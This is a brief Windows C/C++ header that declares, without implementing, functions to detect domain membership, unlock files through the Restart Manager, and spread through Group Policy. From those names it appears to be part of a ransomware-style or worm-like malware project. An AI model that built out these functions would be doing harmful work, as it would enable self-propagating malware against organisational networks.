#pragma once
#include <windows.h>

bool is_domain_joined();
void unlock_file_via_restart_manager(const wchar_t* path);
void spread_via_gpo();
